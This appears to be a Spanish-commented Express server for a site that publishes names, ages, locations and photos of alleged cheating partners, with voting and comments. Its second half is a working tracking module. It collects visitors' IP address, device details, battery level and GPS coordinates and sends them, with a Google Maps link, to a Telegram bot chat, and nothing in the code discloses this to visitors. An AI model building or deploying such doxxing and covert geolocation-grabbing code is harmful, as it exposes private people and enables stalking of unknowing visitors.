import express from "express";
import cors from "cors";
import multer from "multer";
import path from "path";
import { fileURLToPath } from "url";
import pkg from "pg";
const { Pool } = pkg;
const app = express();
// Middleware
app.use(cors());
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true }));
// Multer para fotos
const upload = multer({ storage: multer.memoryStorage() });
// Conexión PostgreSQL
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false },
});
// =======================
// SERVIR CARPETA PUBLIC
// =======================
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
app.use(express.static(path.join(__dirname, "public")));
// Al acceder a /, devuelve index.html
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});
// =======================
// GET – Lista de infieles con comentarios y votos
// =======================
app.get("/infieles", async (req, res) => {
    try {
        const infieles = await pool.query("SELECT * FROM infieles ORDER BY id DESC");
        const resultados = [];
        for (let infiel of infieles.rows) {
            const comentariosQ = await pool.query(
                "SELECT * FROM comentarios WHERE infiel_id=$1 ORDER BY created_at ASC",
                [infiel.id]
            );
            resultados.push({
                ...infiel,
                comentarios: comentariosQ.rows
            });
        }
        res.json(resultados);
    } catch (err) {
        console.error("Error GET:", err);
        res.status(500).json({ error: "Error al obtener datos" });
    }
});
// =======================
// POST – Crear publicación
// =======================
app.post("/nuevo", upload.array("fotos", 10), async (req, res) => {
    try {
        const { reportero, nombre, apellido, edad, ubicacion, historia } = req.body;
        const fotos = req.files?.map(f => f.buffer.toString("base64")) || [];
        const result = await pool.query(
            `INSERT INTO infieles (reportero,nombre,apellido,edad,ubicacion,historia,fotos)
             VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING *`,
            [reportero || "Anónimo", nombre, apellido, edad, ubicacion, historia, fotos]
        );
        res.json({ success: true, data: result.rows[0] });
    } catch (err) {
        console.error("Error POST:", err);
        res.status(500).json({ error: "No se pudo guardar" });
    }
});
// =======================
// POST – Votar
// =======================
app.post("/votar", async (req, res) => {
    try {
        const { infiel_id, usuario, voto } = req.body;
        await pool.query(
            `INSERT INTO votos (infiel_id, usuario, voto) VALUES ($1,$2,$3)
             ON CONFLICT (infiel_id, usuario) DO NOTHING`,
            [infiel_id, usuario, voto]
        );
        if (voto) {
            await pool.query("UPDATE infieles SET votos_reales=votos_reales+1 WHERE id=$1", [infiel_id]);
        } else {
            await pool.query("UPDATE infieles SET votos_falsos=votos_falsos+1 WHERE id=$1", [infiel_id]);
        }
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Error al votar" });
    }
});
// =======================
// POST – Agregar comentario
// =======================
app.post("/comentario", upload.array("fotos", 5), async (req, res) => {
    try {
        const { infiel_id, nombre, texto, propietario } = req.body;
        const fotos = req.files?.map(f => f.buffer.toString("base64")) || [];
        const result = await pool.query(
            `INSERT INTO comentarios (infiel_id,nombre,texto,fotos,propietario)
             VALUES ($1,$2,$3,$4,$5) RETURNING *`,
            [infiel_id, nombre || "Anónimo", texto, fotos, propietario || false]
        );
        res.json({ success: true, data: result.rows[0] });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Error al guardar comentario" });
    }
});

// =======================
// MIGRACIÓN DE TU SISTEMA PHP ANTIGUO (tracking + Telegram)
 // =======================

// Función para obtener IP real (migrado de ip_utils.php)
function getClientIp(req) {
    const keys = [
        'x-client-ip',
        'x-forwarded-for',
        'x-forwarded',
        'x-cluster-client-ip',
        'forwarded-for',
        'forwarded',
        'cf-connecting-ip',  // Para Cloudflare
        'true-client-ip'     // Para Render o otros
    ];

    for (const key of keys) {
        const header = req.headers[key];
        if (header) {
            const ips = header.split(',');
            for (let ip of ips) {
                ip = ip.trim();
                if (ip && ip !== '127.0.0.1' && !ip.startsWith('10.') && !ip.startsWith('192.168.')) {
                    return ip;
                }
            }
        }
    }
    return req.socket.remoteAddress || 'Unknown';
}

// Función para enviar a Telegram (migrado de telegram.php)
async function sendToTelegram(msg) {
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: msg,
        parse_mode: "HTML"
    };
    await fetch(url, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
}

// Temporal para datos del dispositivo (reemplaza resultados.txt)
let visitaTemporal = null;

// Ruta /recibe-info (migrado de recibe_info.php)
app.post("/recibe-info", (req, res) => {
    try {
        const { agent = '', navegador = '', versionapp = '', dystro = '', idioma = '', bateri = 'N/A' } = req.body;

        // Procesar navegador (exacto como tu PHP)
        let navegadorDetectado = "Desconocido";
        if (agent.toLowerCase().includes('brave')) {
            const m = agent.match(/Brave\/([0-9.]+)/);
            navegadorDetectado = m ? `Brave ${m[1]}` : "Brave (basado en Chrome)";
        } else if (agent.toLowerCase().includes('edg')) {
            const m = agent.match(/Edg\/([0-9.]+)/);
            navegadorDetectado = `Edge ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('opr') || agent.toLowerCase().includes('opera')) {
            const m = agent.match(/OPR\/([0-9.]+)/);
            navegadorDetectado = `Opera ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('firefox')) {
            const m = agent.match(/Firefox\/([0-9.]+)/);
            navegadorDetectado = `Firefox ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('safari') && !agent.toLowerCase().includes('chrome')) {
            const m = agent.match(/Version\/([0-9.]+)/);
            navegadorDetectado = `Safari ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('chrome')) {
            const m = agent.match(/Chrome\/([0-9.]+)/);
            navegadorDetectado = `Chrome ${m ? m[1] : ""}`;
        }

        // Sistema operativo
        let sistema = "Desconocido";
        if (agent.toLowerCase().includes("windows nt 10")) sistema = "Windows 10";
        else if (agent.toLowerCase().includes("windows nt 6.3")) sistema = "Windows 8.1";
        else if (agent.toLowerCase().includes("windows nt 6.1")) sistema = "Windows 7";
        else if (agent.toLowerCase().includes("android")) sistema = "Android";
        else if (agent.toLowerCase().includes("iphone")) sistema = "iOS";
        else if (agent.toLowerCase().includes("linux")) sistema = "Linux";

        // Arquitectura
        let arquitectura = '';
        if (dystro.toLowerCase().includes('armv7')) arquitectura = ' (32 bits)';
        else if (dystro.toLowerCase().includes('armv8') || dystro.toLowerCase().includes('aarch64')) arquitectura = ' (64 bits)';
        else arquitectura = ' (64 bits)';

        // Idioma
        let idiomaBonito = idioma || "Desconocido";
        if (idioma === "es-MX") idiomaBonito = "Español (México) - es-MX";
        else if (idioma === "es-ES") idiomaBonito = "Español (España) - es-ES";
        else if (idioma === "en-US") idiomaBonito = "Inglés (EE.UU.) - en-US";

        // Batería
        const bateriaTexto = bateri !== 'N/A' ? `${bateri}%` : "Desconocido";

        // Guardar temporalmente (reemplaza resultados.txt)
        visitaTemporal = `
🖥 Información del Dispositivo

- Navegador: ${navegadorDetectado}
- Sistema Operativo: ${sistema}${arquitectura}
- Idioma: ${idiomaBonito}
- Batería: ${bateriaTexto}
        `.trim();

        res.json({ status: 'ok', mensaje: visitaTemporal });
    } catch (err) {
        console.error("Error en /recibe-info:", err);
        res.status(500).json({ error: "Error" });
    }
});

// Ruta /location (migrado de location.php)
app.post("/location", async (req, res) => {
    try {
        const { latitude, longitude, accuracy } = req.body;
        const ip = getClientIp(req);
        const ua = req.headers['user-agent'] || 'Unknown';
        const ts = new Date().toISOString();

        let msg = "📍 <b>Nueva ubicación</b>\n";
        msg += `🌐 IP: ${ip}\n`;
        if (latitude) msg += `📌 Lat: ${latitude}\n`;
        if (longitude) msg += `📌 Lon: ${longitude}\n`;
        if (accuracy) msg += `🎯 Precisión: ${accuracy}m\n`;
        msg += `🖥️ UA: ${ua}\n\n`;

        msg += "<b>- Información del dispositivo -</b>\n";
        if (visitaTemporal) {
            msg += visitaTemporal + "\n";
        } else {
            msg += "Sin datos del dispositivo\n";
        }

        msg += `\n⏰ Hora: ${ts}`;
        if (latitude && longitude) {
            msg += `\n🌍 Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
        }

        // Enviar a Telegram
        await sendToTelegram(msg);

        // Limpiar temporal
        visitaTemporal = null;

        res.json({ status: 'logged', timestamp: ts });
    } catch (err) {
        console.error("Error en /location:", err);
        res.status(500).json({ error: "Error" });
    }
});
